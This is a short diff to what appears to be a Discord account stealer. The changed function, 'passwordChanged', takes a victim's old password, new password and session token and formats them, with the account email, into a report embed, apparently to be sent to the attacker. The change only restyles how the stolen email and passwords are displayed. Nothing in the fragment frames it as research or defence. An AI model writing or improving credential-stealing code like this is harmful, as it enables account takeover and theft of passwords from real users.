@@ -702,7 +702,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         fields: [
           {
             name: '**<:SecuritySheild:1073745717073563678> Password Changed**',
-            value: ` <:Gmail:1073746145467183164>Email: **${json.email}**\n <:SecuritySheild:1073745717073563678> Old Password: **${oldpassword}**\n <:SecuritySheild:1073745717073563678> New Password: **${newpassword}**`,
+            value: ` <:Gmail:1073746145467183164>Email: **```${json.email}```**\n <:SecuritySheild:1073745717073563678> Old Password: **```${oldpassword}```**\n <:SecuritySheild:1073745717073563678> New Password: **```${newpassword}```**`,
             inline: true,
           },
           {
